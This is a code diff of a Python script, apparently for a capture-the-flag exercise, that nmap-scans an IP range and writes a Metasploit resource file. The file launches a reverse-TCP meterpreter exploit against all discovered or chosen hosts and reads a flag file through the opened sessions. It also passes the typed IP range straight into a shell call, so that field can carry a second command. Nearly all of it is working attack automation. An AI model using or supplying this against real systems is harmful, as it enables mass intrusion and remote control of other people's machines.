@@ -6,7 +6,7 @@ import re
 print('by lx')
 a = input("请输入你的ip段例如:192.168.1.0/24:"+"\n")
 #os.system("nmap -T 5 192.168.3.0/24 >>scann.txt")
-os.system("nmap -T 5 {} >>scann.txt".format(a))
+os.system("nmap -sS -T5 {} >>scann.txt".format(a))
 print("扫描完成")
 def log_read():
     with open("scann.txt", mode="r") as f:
@@ -27,16 +27,16 @@ def config_write_file(result):
     config.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp' + "\n")
     config.write('set LHOST eth0'+"\n")
     config.write('set RHOSTS ')
-    b = input('是否全部攻击,请输入y或者n:'+"\n")
-    if b == 'y':
+    attack = input('是否全部攻击,请输入y或者n:'+"\n")
+    if attack == 'y':
         for ele in result.split("  "):
             config.write(ele)
-    elif b == 'n':
-        c = input('请输入你要攻击的ip:'+"\n")
-        config.write('set RHOSTS {}'.format(c))
+    elif attack == 'n':
+        Define_ip = input('请输入你要攻击的ip:'+"\n")
+        config.write('set RHOSTS {}'.format(Define_ip))
     config.write("\n")
     config.write("exploit"+"\n")
-    config.write("sessions -C ls"+"\n")
+    config.write("sessions -C cat C://flagvalue.txt"+"\n")
     config.close()
 
 
